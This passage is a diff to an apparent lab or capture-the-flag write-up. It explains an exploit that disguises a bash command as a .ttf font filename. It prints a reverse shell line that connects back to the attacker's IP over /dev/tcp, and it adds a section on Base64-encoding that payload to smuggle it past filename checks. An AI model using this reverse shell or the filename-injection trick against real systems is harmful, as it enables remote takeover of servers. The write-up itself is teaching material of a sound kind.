@@ -1900,13 +1900,19 @@ print(f"Created exploit.zip with filename: {exploit_filename}")
 
 The goal of this script is to create a filename that looks like a valid `.ttf` font file to a human (and to a simple Regex), but acts like a **Bash command** to the server.
 
-#### **The Payload (The "Phone Home" instructions)**
-
 ```python
 payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
 ```
 
 This is a classic reverse shell string. It tells the target: "Open a bash shell and send it over the network to my Kali IP at port 4445."
+
+```python
+b64_payload = base64.b64encode(payload.encode()).decode()
+```
+
+The section converts your payload into a string of random-looking characters (Base64) so we can smuggle the rev-shell command.
+
+- **Why?** Reverse shells contain "illegal" characters like `>`, `&`, and spaces. If you put those directly in a filename, the Linux filesystem or the `process_client` script might crash or reject it. Base64 turns those symbols into safe letters and numbers.
 <div align="center">
 <br>
 <br>
